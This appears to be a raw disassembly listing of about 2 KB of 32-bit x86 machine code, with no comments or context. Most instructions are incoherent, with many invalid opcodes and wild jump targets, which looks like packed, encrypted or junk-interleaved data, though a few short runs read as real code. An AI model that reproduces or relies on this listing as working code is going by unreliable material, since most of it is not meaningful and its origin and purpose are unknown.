  411b9e:	cmp    cl,BYTE PTR [esi+esi*8]
  411ba1:	cmp    eax,0x623d2c57
  411ba6:	and    ch,BYTE PTR [eax+0x328ba35]
  411bac:	sbb    al,0x61
  411bae:	popa   
  411baf:	inc    esp
  411bb0:	xor    DWORD PTR [eax-0x63fbcb3f],esp
  411bb6:	jp     0x411b65
  411bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb9:	iret   
  411bba:	push   0x42217159
  411bbf:	push   ss
  411bc0:	ja     0x411c2f
  411bc2:	ins    DWORD PTR es:[edi],dx
  411bc3:	inc    esp
  411bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bc5:	and    al,0x1a
  411bc7:	into   
  411bc8:	mov    esi,0x85729608
  411bcd:	(bad)  
  411bce:	loope  0x411bf1
  411bd0:	add    eax,0xf8dc5966
  411bd5:	fwait
  411bd6:	ja     0x411c31
  411bd8:	xor    ebx,edx
  411bda:	push   ss
  411bdb:	rcr    BYTE PTR [edx-0x15],1
  411bde:	dec    esp
  411bdf:	cmp    esi,DWORD PTR [esi*4-0x67f78f6a]
  411be6:	dec    ecx
  411be7:	dec    ebx
  411be8:	stos   DWORD PTR es:[edi],eax
  411be9:	outs   dx,DWORD PTR ds:[esi]
  411bea:	jno    0x411c1e
  411bec:	push   0x36bb8e81
  411bf1:	(bad)  
  411bf2:	rcl    BYTE PTR [ebx-0x6ad5be83],1
  411bf8:	cmp    esp,DWORD PTR [ecx]
  411bfa:	ins    DWORD PTR es:[edi],dx
  411bfb:	jne    0x411b8f
  411bfd:	daa    
  411bfe:	and    al,0x93
  411c00:	mov    ch,0x86
  411c02:	push   edx
  411c03:	(bad)  
  411c04:	fidivr WORD PTR [ebx-0x474b853f]
  411c0a:	mov    ah,0x3e
  411c0c:	mov    ebp,0x832f23cb
  411c11:	test   eax,0x20b74d14
  411c16:	sub    al,0xe5
  411c18:	mov    esp,0x1f51113c
  411c1d:	adc    al,0xf8
  411c1f:	pop    edx
  411c20:	icebp  
  411c21:	adc    DWORD PTR [ebp-0x604baa7d],edx
  411c27:	and    cl,ah
  411c29:	into   
  411c2a:	sbb    ecx,DWORD PTR [esp+esi*4]
  411c2d:	in     eax,dx
  411c2e:	fs pop ebx
  411c30:	push   es
  411c31:	mov    ebx,0xa0c084bf
  411c36:	jmp    0x7e03ca5a
  411c3b:	cmp    ebx,DWORD PTR [eax-0x4e]
  411c3e:	jbe    0x411bdd
  411c40:	ja     0x411c06
  411c42:	mov    cl,0x8e
  411c44:	dec    eax
  411c45:	aaa    
  411c46:	or     ah,ah
  411c48:	dec    edi
  411c49:	add    DWORD PTR [edi],ecx
  411c4b:	add    ah,ch
  411c4d:	repnz lds ebp,FWORD PTR [edi-0x5e]
  411c51:	into   
  411c52:	push   ebp
  411c53:	push   cs
  411c54:	pop    edx
  411c55:	shr    BYTE PTR [edi+0x54],1
  411c58:	(bad)  
  411c59:	ins    DWORD PTR es:[edi],dx
  411c5a:	jne    0x411c74
  411c5c:	xchg   edx,eax
  411c5d:	icebp  
  411c5e:	dec    esp
  411c5f:	add    BYTE PTR [eax],0x83
  411c62:	(bad)  
  411c63:	scas   al,BYTE PTR es:[edi]
  411c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c65:	push   esp
  411c66:	ret    0x9dbe
  411c69:	add    eax,0xfc9ba056
  411c6e:	cli    
  411c6f:	repz mov ah,0x98
  411c72:	add    DWORD PTR [edx-0x54],0xffffffcf
  411c76:	inc    eax
  411c77:	(bad)  
  411c79:	pop    esp
  411c7a:	sub    eax,0x48931370
  411c7f:	cmp    al,0x45
  411c81:	mov    ds:0x6a1b888c,eax
  411c86:	ds (bad) 
  411c88:	into   
  411c89:	stos   BYTE PTR es:[edi],al
  411c8a:	(bad)  
  411c8b:	shl    esp,cl
  411c8d:	sub    bh,dh
  411c8f:	mov    eax,0x91fa2768
  411c94:	dec    edi
  411c95:	xor    ebx,esp
  411c97:	packuswb mm0,mm1
  411c9a:	dec    esi
  411c9b:	fwait
  411c9c:	push   edx
  411c9d:	mov    esp,ecx
  411c9f:	or     al,0x97
  411ca1:	(bad)  
  411ca2:	out    dx,eax
  411ca3:	lods   eax,DWORD PTR ds:[esi]
  411ca4:	jmp    0x5f86:0xd3e463be
  411cab:	jecxz  0x411cf5
  411cad:	xor    BYTE PTR [ebp+ebp*2-0x20],ch
  411cb1:	jnp    0x411cd7
  411cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cb4:	dec    ebp
  411cb5:	xchg   esi,eax
  411cb6:	imul   BYTE PTR [ecx+0x6d]
  411cb9:	lea    ecx,[edx+0x28]
  411cbc:	gs mov esp,0x3907f7ed
  411cc2:	rol    DWORD PTR [edi],0x7d
  411cc5:	test   edx,ebp
  411cc7:	enter  0x9287,0x16
  411ccb:	repnz cmp ebp,DWORD PTR ds:[ecx]
  411ccf:	sbb    al,0x85
  411cd1:	mov    ebx,0xb7523caf
  411cd6:	fidiv  WORD PTR [ebp-0x75]
  411cd9:	jge    0x411cd3
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x1666579e
  411cfd:	leave  
  411cfe:	mov    bl,0x1a
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	dec    ebx
  411d09:	lea    ecx,[eax]
  411d0b:	sub    al,0x22
  411d0d:	push   es
  411d0e:	out    dx,eax
  411d0f:	(bad)  
  411d11:	shl    BYTE PTR [ebx],0x3e
  411d14:	sub    ebp,ecx
  411d16:	ins    BYTE PTR es:[edi],dx
  411d17:	lods   al,BYTE PTR ds:[esi]
  411d18:	or     eax,DWORD PTR [eax+0x5e]
  411d1b:	stos   DWORD PTR es:[edi],eax
  411d1c:	and    BYTE PTR [edi-0x23],bh
  411d1f:	es das 
  411d21:	or     ebx,0xffffffb3
  411d24:	jecxz  0x411d1b
  411d26:	mov    cl,ch
  411d28:	pusha  
  411d29:	stc    
  411d2a:	loop   0x411d92
  411d2c:	sbb    BYTE PTR [ecx-0x3701a35f],al
  411d32:	adc    al,0xee
  411d34:	leave  
  411d35:	xchg   ecx,eax
  411d36:	mov    edi,0xe4566c7e
  411d3b:	mov    bh,0x82
  411d3d:	mov    cl,0x99
  411d3f:	jge    0x411d8c
  411d41:	fcom   st(6)
  411d43:	nop
  411d44:	ret    
  411d45:	loope  0x411d6c
  411d47:	(bad)  
  411d48:	xlat   BYTE PTR ds:[ebx]
  411d49:	imul   ebx,DWORD PTR [ecx-0x1a],0x3724a27a
  411d50:	pop    edi
  411d51:	dec    esp
  411d52:	ret    
  411d53:	mov    eax,ds:0x45ea72f6
  411d58:	adc    eax,0xaf52ab3b
  411d5d:	fsubr  QWORD PTR [ebx-0x58bef961]
  411d63:	bound  esi,QWORD PTR ds:0xaed269a5
  411d69:	pusha  
  411d6a:	call   0xf99a5e44
  411d6f:	xor    edx,eax
  411d71:	inc    eax
  411d72:	sub    al,0xbe
  411d74:	popf   
  411d75:	jmp    0x1623826
  411d7a:	loope  0x411dec
  411d7c:	inc    ebx
  411d7d:	outs   dx,DWORD PTR ds:[esi]
  411d7e:	in     al,0x6c
  411d80:	int    0xb0
  411d82:	ror    BYTE PTR ds:0xd59f9642,1
  411d88:	cmp    eax,0xd84fee4
  411d8d:	sbb    eax,0xa264c9eb
  411d92:	out    0x92,eax
  411d94:	jno    0x411df6
  411d96:	pop    ebx
  411d97:	inc    ecx
  411d98:	push   esi
  411d99:	stos   BYTE PTR es:[edi],al
  411d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d9b:	xor    DWORD PTR ss:[ebp+0x553fe8e7],ecx
  411da2:	into   
  411da3:	xchg   esp,eax
  411da4:	mov    WORD PTR [edx+0x6a90f119],ss
  411daa:	inc    eax
  411dab:	mul    DWORD PTR [ebx+0x73]
  411dae:	shl    DWORD PTR [edi],0xd1
  411db1:	mov    esp,DWORD PTR [ebp-0x1]
  411db4:	jmp    0xf013:0xc4355767
  411dbb:	jge    0x411de6
  411dbd:	(bad)  
  411dbe:	adc    BYTE PTR [edi-0x2f414c81],al
  411dc4:	shr    DWORD PTR [esi],1
  411dc6:	hlt    
  411dc7:	xor    DWORD PTR [ecx-0x42a9b915],esi
  411dcd:	hlt    
  411dce:	mov    es,WORD PTR [eax-0x1788d380]
  411dd4:	ja     0x411e40
  411dd6:	push   esi
  411dd7:	rol    BYTE PTR [ebx-0x26],1
  411dda:	jp     0x411d5e
  411ddc:	pop    esp
  411ddd:	jp     0x411dd2
  411ddf:	mov    ds:0x65584a3e,al
  411de4:	cmc    
  411de5:	push   edx
  411de6:	jb     0x411e5d
  411de8:	cld    
  411de9:	ret    
  411dea:	es repnz mov bh,0xfd
  411dee:	divps  xmm5,XMMWORD PTR [ebp-0x54]
  411df2:	lods   eax,DWORD PTR ds:[esi]
  411df3:	xchg   ebx,eax
  411df4:	jnp    0x411e03
  411df6:	dec    esi
  411df7:	mov    ch,0x9
  411df9:	xchg   ecx,eax
  411dfa:	scas   al,BYTE PTR es:[edi]
  411dfb:	mov    ah,0x8
  411dfd:	xchg   BYTE PTR [edi-0x75],dh
  411e00:	and    eax,0x19d8c1d
  411e05:	xchg   edi,eax
  411e06:	in     al,0xef
  411e08:	mov    esi,0xce1b78ad
  411e0d:	mov    esp,0x311296a7
  411e12:	dec    esp
  411e13:	addr16 icebp 
  411e15:	add    al,0x8f
  411e17:	push   esp
  411e18:	mov    esp,0xd098a17d
  411e1d:	js     0x411da4
  411e1f:	push   cs
  411e20:	push   ebp
  411e21:	es inc esp
  411e23:	js     0x411e03
  411e25:	adc    al,0x5
  411e27:	sub    ah,BYTE PTR [ecx+0x5b4b1a02]
  411e2d:	out    0x26,al
  411e2f:	add    BYTE PTR [edi],0x75
  411e32:	cmp    DWORD PTR [edi+0x65],esi
  411e35:	stc    
  411e36:	loopne 0x411ddb
  411e38:	xchg   esp,eax
  411e39:	or     BYTE PTR ds:0x90a2877a,cl
  411e3f:	xchg   ecx,eax
  411e40:	or     BYTE PTR [esi+ecx*4],ch
  411e43:	xchg   ecx,eax
  411e44:	out    0xa0,eax
  411e46:	pop    eax
  411e47:	pop    ecx
  411e48:	cs inc eax
  411e4a:	pop    eax
  411e4b:	jp     0x411e33
  411e4d:	jb     0x411e3b
  411e4f:	xchg   edi,eax
  411e50:	test   BYTE PTR [edi],ch
  411e52:	in     eax,dx
  411e53:	icebp  
  411e54:	pop    es
  411e55:	repnz aad 0xa
  411e58:	fs adc al,0xf5
  411e5b:	aad    0x9c
  411e5d:	fst    DWORD PTR cs:0x77047b02
  411e64:	mov    bh,0x93
  411e66:	xchg   ecx,ebx
  411e68:	dec    ecx
  411e69:	xchg   ecx,eax
  411e6a:	and    al,0xe9
  411e6c:	int3   
  411e6d:	jecxz  0x411df0
  411e6f:	int3   
  411e70:	arpl   WORD PTR [ecx-0x11],si
  411e73:	jmp    0xbbe9:0x5c60ea12
  411e7a:	outs   dx,BYTE PTR ds:[esi]
  411e7b:	add    esi,DWORD PTR [ecx]
  411e7d:	mov    cs,eax
  411e7f:	pop    ds
  411e80:	repnz mov DWORD PTR [esi+ecx*1],0xd6306081
  411e88:	retf   0x7c22
  411e8b:	add    BYTE PTR [ebx],0xa3
  411e8e:	cli    
  411e8f:	push   eax
  411e90:	mov    bl,0xf4
  411e92:	inc    eax
  411e93:	inc    ebx
  411e94:	and    DWORD PTR [ebx-0x86aca8d],edx
  411e9a:	int    0x5e
  411e9c:	xchg   ebx,edi
  411e9e:	test   cl,dh
  411ea0:	test   al,0xe5
  411ea2:	enter  0x78bc,0xe7
  411ea6:	(bad)  
  411ea7:	dec    ebx
  411ea8:	fsub   DWORD PTR [ebx]
  411eaa:	jne    0x411f0c
  411eac:	lahf   
  411ead:	cmp    BYTE PTR [esi+0x7d],0xaf
  411eb1:	pushf  
  411eb2:	bound  edi,QWORD PTR [eax]
  411eb4:	mov    eax,0x9f379d08
  411eb9:	or     DWORD PTR [eax-0x65790dad],0x11
  411ec0:	or     edx,DWORD PTR [edi-0x47]
  411ec3:	fs adc al,0x18
  411ec6:	stos   DWORD PTR es:[edi],eax
  411ec7:	or     BYTE PTR [edi-0x793cb0e7],dl
  411ecd:	ins    BYTE PTR es:[edi],dx
  411ece:	nop
  411ecf:	ret    
  411ed0:	mov    dh,0xdf
  411ed2:	das    
  411ed3:	data16 jne 0x411f33
  411ed6:	(bad)  
  411ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed8:	jo     0x411f33
  411eda:	mov    ds:0xee52a724,eax
  411edf:	pop    ecx
  411ee0:	xor    al,0x58
  411ee2:	dec    ebx
  411ee4:	ins    DWORD PTR es:[edi],dx
  411ee5:	icebp  
  411ee6:	fldcw  WORD PTR [ecx]
  411ee8:	xlat   BYTE PTR ds:[ebx]
  411ee9:	jbe    0x411ec7
  411eeb:	adc    al,0x28
  411eed:	mov    ch,0x64
  411eef:	sbb    DWORD PTR [ebx+0x51],ebx
  411ef2:	enter  0xf661,0xbe
  411ef6:	cdq    
  411ef7:	iret   
  411ef8:	and    ch,cl
  411efa:	push   ecx
  411efb:	loop   0x411f32
  411efd:	stos   DWORD PTR es:[edi],eax
  411efe:	mov    ah,0x94
  411f00:	fs aam 0xcd
  411f03:	cld    
  411f04:	push   edx
  411f05:	(bad)  
  411f07:	push   edi
  411f08:	dec    edx
  411f09:	out    dx,al
  411f0a:	push   eax
  411f0b:	jl     0x411ebc
  411f0d:	or     eax,0x64a68d95
  411f12:	aad    0x34
  411f14:	sti    
  411f15:	and    ebx,edx
  411f17:	adc    al,0xa7
  411f19:	mov    esi,0x6e23668
  411f1e:	enter  0xc4fb,0x9e
  411f22:	neg    DWORD PTR [ecx]
  411f24:	and    eax,0x70c8636f
  411f29:	xor    ch,BYTE PTR [ebx-0x38e996e7]
  411f2f:	mov    ecx,ebx
  411f31:	adc    ch,BYTE PTR [edi+eiz*8]
  411f34:	inc    esi
  411f35:	test   cl,dl
  411f37:	push   edi
  411f38:	pop    ebp
  411f39:	ror    BYTE PTR [ecx],0xd0
  411f3c:	(bad)  
  411f3d:	cli    
  411f3e:	or     BYTE PTR [edi-0x3e4e8f0e],dh
  411f44:	adc    ax,0xad63
  411f48:	hlt    
  411f49:	jge    0x411fa4
  411f4b:	mov    ah,0xcb
  411f4d:	or     eax,esi
  411f4f:	pop    ds
  411f50:	xor    eax,DWORD PTR [ebp-0x6]
  411f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f54:	inc    esp
  411f55:	aas    
  411f56:	imul   ebx,DWORD PTR [ecx],0x48
  411f59:	shr    DWORD PTR [ebx-0x203a3fcf],cl
  411f5f:	dec    ecx
  411f60:	mov    ecx,0x8dc8c5ec
  411f65:	jl     0x411f23
  411f67:	cdq    
  411f68:	(bad)  
  411f69:	lahf   
  411f6a:	pop    esp
  411f6b:	popa   
  411f6c:	ins    BYTE PTR es:[edi],dx
  411f6d:	xchg   ebp,eax
  411f6e:	test   DWORD PTR [eax-0x39],eax
  411f71:	adc    bl,BYTE PTR [edi-0x75]
  411f74:	push   ebp
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	xchg   esi,eax
  411f8f:	sub    ecx,DWORD PTR [esi-0x69]
  411f92:	jmp    0x411fff
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	or     edi,ebp
  411f9c:	adc    BYTE PTR [esi],ch
  411f9e:	std    
  411f9f:	sbb    DWORD PTR [ecx-0x73],edx
  411fa2:	ins    BYTE PTR es:[edi],dx
  411fa3:	sub    eax,0x3245d0
  411fa8:	add    DWORD PTR [edi+0x68eef3d3],0xfffffffd
  411faf:	jl     0x412024
  411fb1:	cmp    al,0x23
  411fb3:	and    dh,bl
  411fb5:	pop    esp
  411fb6:	xor    DWORD PTR [ebx+0x5fe978c3],eax
  411fbc:	jb     0x41202d
  411fbe:	out    dx,al
  411fbf:	mov    edi,DWORD PTR [edi+0x56]
  411fc2:	inc    esp
  411fc3:	call   0xcf08:0x27bec3b6
  411fca:	jmp    0x411fa2
  411fcc:	imul   esi,DWORD PTR [edx+esi*2+0x15],0x27
  411fd1:	icebp  
  411fd2:	and    BYTE PTR [eax],cl
  411fd4:	and    DWORD PTR [ebp+0x1386471d],edx
  411fda:	pop    esp
  411fdb:	lea    eax,[edi-0x5d]
  411fde:	leave  
  411fdf:	push   es
  411fe0:	pop    ecx
  411fe1:	lahf   
  411fe2:	aas    
  411fe3:	cmp    DWORD PTR [eax+0x15],ebp
  411fe6:	cmp    al,0x7
  411fe8:	push   ss
  411fe9:	sahf   
  411fea:	aad    0x6c
  411fec:	outs   dx,DWORD PTR ds:[esi]
  411fed:	mov    ah,BYTE PTR [ebx]
  411fef:	or     cl,ch
  411ff1:	and    esi,DWORD PTR [esi*8+0x51184ff8]
  411ff8:	xchg   edx,eax
  411ff9:	dec    ecx
  411ffa:	mov    bl,0x64
  411ffc:	mov    eax,0xa95520f8
  412001:	shl    edi,1
  412003:	cdq    
  412004:	jecxz  0x41200b
  412006:	xchg   edi,eax
  412007:	leave  
  412008:	fdivrp st(3),st
  41200a:	inc    ebp
  41200b:	out    0x8c,eax
  41200d:	add    DWORD PTR [esi+0x1054ee31],ecx
  412013:	pop    esp
  412014:	or     BYTE PTR [ebx-0x9],ch
  412017:	or     ecx,DWORD PTR [ecx-0x43]
  41201a:	mov    cl,0xe6
  41201c:	scas   al,BYTE PTR es:[edi]
  41201d:	inc    edx
  41201e:	mov    dl,0x26
  412020:	sub    al,0x5
  412022:	(bad)  
  412023:	pop    esi
  412024:	jmp    0x41201a
  412026:	ret    0x7087
  412029:	cld    
  41202a:	adc    BYTE PTR [esi],0x32
  41202d:	sub    dl,BYTE PTR [ebx+0x43]
  412030:	mov    edx,0xe17e7ef2
  412035:	stos   DWORD PTR es:[edi],eax
  412036:	outs   dx,BYTE PTR ds:[esi]
  412037:	test   BYTE PTR [ebx+0x4457d059],bh
  41203d:	mov    bl,0x63
  41203f:	mov    dl,0x23
  412042:	ins    BYTE PTR es:[edi],dx
  412043:	test   dl,bl
  412045:	cli    
  412046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412047:	sbb    al,0xf5
  412049:	aaa    
  41204a:	xchg   esp,eax
  41204b:	sub    eax,0x2285d763
  412050:	mov    esp,0xe8c641e9
  412055:	daa    
  412056:	call   0xeca169aa
  41205b:	inc    ebx
  41205c:	mov    al,ds:0x1c5dbf8d
  412061:	xchg   DWORD PTR [edx-0x669e8ee1],ebp
  412067:	inc    edx
  412068:	hlt    
  412069:	mov    ah,0x3a
  41206b:	pop    edx
  41206c:	test   edx,ebx
  41206e:	jns    0x412077
  412070:	adc    dl,0x7c
  412073:	pop    es
  412074:	pop    esi
  412075:	jle    0x4120d8
  412077:	inc    esp
  412078:	xor    BYTE PTR [ecx-0xc4a8a91],al
  41207e:	pop    ecx
  41207f:	dec    ecx
  412080:	lock jo 0x412029
  412083:	mov    ds:0xef3b0612,al
  412088:	pusha  
  412089:	ds jg  0x41203b
  41208c:	xor    al,0xc
  41208e:	nop
  41208f:	out    0xcc,al
  412091:	cdq    
  412092:	adc    al,0x6
  412094:	xor    BYTE PTR ds:0x7904e0cc,ch
  41209a:	fldcw  WORD PTR [eax+edx*8]
  41209d:	imul   esi,DWORD PTR [esi+0x25],0x9e102ad2
  4120a4:	jmp    0xce82fcd6
  4120a9:	jp     0x4120b5
  4120ab:	inc    esp
  4120ac:	(bad)  
  4120ad:	test   eax,0x42c760f4
  4120b2:	fwait
  4120b3:	sub    bl,BYTE PTR [ebx+0x3d]
  4120b6:	(bad)  
  4120b7:	clc    
  4120b8:	sub    al,ch
  4120ba:	mov    ebx,0x89a28647
  4120bf:	inc    ecx
  4120c0:	add    BYTE PTR [edx+0x18df804a],bh
  4120c6:	(bad)  
  4120c7:	sar    DWORD PTR [ebp-0x22],1
  4120ca:	fmul   QWORD PTR [edi]
  4120cc:	cdq    
  4120cd:	(bad)  
  4120ce:	(bad)  
  4120cf:	dec    ebx
  4120d0:	(bad)  [ebx-0x79e11e51]
  4120d6:	xor    al,0xbc
  4120d8:	(bad)  
  4120d9:	ins    DWORD PTR es:[edi],dx
  4120da:	gs cld 
  4120dc:	and    DWORD PTR [edx+0x51],0xb7cc3745
  4120e3:	in     eax,0xcf
  4120e5:	or     BYTE PTR [eax+ebx*8-0x75],ah
  4120e9:	sar    ebp,cl
  4120eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ec:	nop
  4120ed:	push   ebx
  4120ee:	dec    edx
  4120ef:	xchg   ebx,eax
  4120f0:	jo     0x41210f
  4120f2:	adc    ebx,DWORD PTR [edi+esi*4+0x7fd1b758]
  4120f9:	in     eax,0x6c
  4120fb:	aaa    
  4120fc:	gs and eax,0x9736e7be
  412102:	stos   BYTE PTR es:[edi],al
  412103:	mov    gs,edx
  412105:	xor    eax,0xc04c56b
  41210a:	cmc    
  41210b:	pusha  
  41210c:	mov    WORD PTR [ecx+eax*8+0x4bd438c2],fs
  412113:	pop    ds
  412114:	mov    bh,0x9e
  412116:	pop    ebx
  412117:	sub    DWORD PTR [ebx+0x46],edx
  41211a:	jno    0x412107
  41211c:	fs push eax
  41211e:	pop    es
  41211f:	jge    0x412163
  412121:	shr    eax,0x31
  412124:	scas   eax,DWORD PTR es:[edi]
  412125:	jns    0x4120c5
  412127:	int3   
  412128:	xchg   DWORD PTR [ebx],edx
  41212a:	jo     0x4120d5
  41212c:	jb     0x41216d
  41212e:	xor    ah,dl
  412130:	lods   al,BYTE PTR ds:[esi]
  412131:	sbb    cl,0x5e
  412134:	loopne 0x412103
  412136:	add    bl,BYTE PTR [edi+0x58eea7c3]
  41213c:	into   
  41213d:	(bad)  
  41213f:	pop    esi
  412140:	sahf   
  412141:	dec    esi
  412142:	ja     0x412151
  412144:	pop    eax
  412145:	jne    0x4120d4
  412147:	imul   esp,ecx,0x68633338
  41214d:	cmp    al,0x63
  41214f:	pusha  
  412150:	xchg   BYTE PTR [ebx],ah
  412152:	mov    eax,ds:0xa0a199e8
  412157:	jmp    0xbfbf50eb
  41215c:	and    edx,esp
  41215e:	and    bl,0x9a
  412161:	stc    
  412162:	sub    eax,0x2a2863f8
  412167:	popa   
  412168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412169:	add    al,0x83
  41216b:	pushf  
  41216c:	mov    ds:0x4560648f,eax
  412171:	and    eax,DWORD PTR [esi]
  412173:	cmp    al,0x58
  412175:	sub    DWORD PTR fs:[ebx-0x31e0e991],esp
  41217c:	xchg   ebx,edx
  41217e:	int3   
  41217f:	rcr    DWORD PTR [ecx],cl
  412181:	div    ebx
  412183:	int    0x31
  412185:	or     al,0x2e
  412187:	xor    esi,ebx
  412189:	retf   0xc8fe
  41218c:	pop    esi
  41218d:	shl    DWORD PTR [ecx-0x5ba4b881],cl
  412193:	pop    es
  412194:	adc    BYTE PTR [edi],dh
  412196:	push   edx
  412197:	add    DWORD PTR [ecx-0x22],esi
  41219a:	ret    
  41219b:	scas   al,BYTE PTR es:[edi]
  41219c:	or     BYTE PTR [esi+eax*2-0x59],cl
  4121a0:	mov    ah,0x4
  4121a2:	xchg   ebx,eax
  4121a3:	mov    esp,0x2c793d36
  4121a8:	ins    BYTE PTR es:[edi],dx
  4121a9:	or     bl,dl
  4121ab:	aas    
  4121ac:	jl     0x41216d
  4121ae:	icebp  
  4121af:	xor    al,0x3b
  4121b1:	ins    BYTE PTR es:[edi],dx
  4121b2:	pop    es
  4121b3:	cmc    
  4121b4:	sbb    al,0xa5
  4121b6:	xchg   edx,eax
  4121b7:	std    
  4121b8:	arpl   WORD PTR [edi-0x3b],dx
  4121bb:	xchg   ebp,eax
  4121bc:	ss inc ecx
  4121be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121bf:	mov    ebx,0x8055cc1f
  4121c4:	mov    eax,ds:0xce7a900
  4121c9:	fild   WORD PTR [ecx-0x4b]
  4121cc:	push   esi
  4121cd:	aam    0xff
  4121cf:	repz fimul DWORD PTR [edx]
  4121d2:	jno    0x41223a
  4121d4:	dec    edi
  4121d5:	frndint 
  4121d7:	ret    0xc5c5
  4121da:	pop    ds
  4121db:	inc    edi
  4121dc:	sub    ch,ah
  4121de:	push   0x5daa67b7
  4121e3:	mov    ch,0x57
  4121e5:	and    al,0xde
  4121e7:	test   BYTE PTR [edx],ch
  4121e9:	das    
  4121ea:	test   al,0xe3
  4121ec:	pop    edx
  4121ed:	arpl   WORD PTR [esp+ebx*2],dx
  4121f0:	inc    BYTE PTR [eax-0x3f32561c]
  4121f6:	adc    al,0xae
  4121f8:	lods   eax,DWORD PTR ds:[esi]
  4121f9:	dec    esp
  4121fa:	arpl   WORD PTR ds:0xe3b4fc3f,si
  412200:	mov    ecx,0x810ac188
  412205:	add    edi,ecx
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	jb     0x4121c2
  412235:	out    0x40,eax
  412237:	push   eax
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	dec    edi
  412240:	jmp    0x3b1c64a
  412245:	mov    eax,edx
  412247:	push   0xffffffc3
  412249:	in     al,dx
  41224a:	jle    0x4122b4
  41224c:	mov    edx,0x1db469d4
  412251:	shl    DWORD PTR [edx+eax*2],1
  412254:	neg    ch
  412256:	push   edx
  412257:	mov    eax,0x30cc3358
  41225c:	dec    BYTE PTR [ebx]
  41225e:	jnp    0x412262
  412260:	ss out 0x18,eax
  412263:	xor    eax,DWORD PTR [ecx-0x25f1ec74]
  412269:	loopne 0x412293
  41226b:	bound  ecx,QWORD PTR [ecx-0x284af61]
  412271:	pop    di
  412273:	or     bl,BYTE PTR [eax+0x57428bea]
  412279:	xor    ebx,esi
  41227b:	jg     0x412245
  41227d:	test   eax,0x4ce14a99
  412282:	int    0xcd
  412284:	mov    ah,0x1c
  412286:	mov    ebp,0xdcf2aa4f
  41228b:	gs pushf 
  41228d:	in     al,dx
  41228e:	inc    ecx
  41228f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412290:	push   ds
  412291:	mov    bh,0x21
  412293:	daa    
  412294:	shr    esi,1
  412296:	pop    ds
  412297:	adc    eax,0x59b0da3b
  41229c:	pop    esi
  41229d:	pop    esi
  41229e:	and    al,0xdf
  4122a0:	sub    ah,al
  4122a2:	push   edi
  4122a3:	adc    ch,BYTE PTR [edx-0x4a76f95f]
  4122a9:	jge    0x41223f
  4122ab:	mov    ebx,0x98331475
  4122b0:	pop    ss
  4122b1:	inc    ebp
  4122b2:	mov    ds:0xccdb2261,eax
  4122b7:	xlat   BYTE PTR ds:[ebx]
  4122b8:	jbe    0x412272
  4122ba:	iret   
  4122bb:	out    0xf0,eax
  4122bd:	mov    DWORD PTR [ebp-0x5a65acbe],esp
  4122c3:	outs   dx,DWORD PTR ds:[esi]
  4122c4:	push   0x7e4d2c36
  4122c9:	jnp    0x70eaa477
  4122cf:	das    
  4122d0:	stc    
  4122d1:	lods   al,BYTE PTR ds:[esi]
  4122d2:	cmp    cl,BYTE PTR [ebp+0x402a7630]
  4122d8:	lds    ebx,FWORD PTR [edi-0x2ca66492]
  4122de:	test   ah,al
  4122e0:	push   ebx
  4122e1:	or     ebp,0x30
  4122e4:	push   ecx
  4122e5:	call   0x6d9ab5e3
  4122ea:	pop    ds
  4122eb:	and    esi,DWORD PTR [esi-0x62]
  4122ee:	js     0x41230f
  4122f0:	mov    DWORD PTR [ebx],ebp
  4122f2:	adc    al,0x1e
  4122f4:	retf   0xe3c1
  4122f7:	xlat   BYTE PTR ds:[ebx]
  4122f8:	cdq    
  4122f9:	shr    bl,1
  4122fb:	retf   
  4122fc:	ins    BYTE PTR es:[edi],dx
  4122fd:	ins    BYTE PTR es:[edi],dx
  4122fe:	or     bh,BYTE PTR [ebp+0x14]
  412301:	into   
  412302:	or     DWORD PTR [esi+edi*2+0x3d],edi
  412306:	cmp    bh,BYTE PTR [edi]
  412308:	nop
  412309:	fisttp QWORD PTR [ebx]
  41230b:	out    0x52,al
  41230d:	xchg   ebp,eax
  41230e:	in     al,0x97
  412310:	push   esp
  412311:	test   BYTE PTR [edx],dh
  412313:	mov    edi,0x2088dee4
  412318:	jmp    0x5129:0x9a0a4c1f
  41231f:	inc    eax
  412320:	les    ebx,FWORD PTR [ecx+0x4f]
  412323:	sbb    esp,ebp
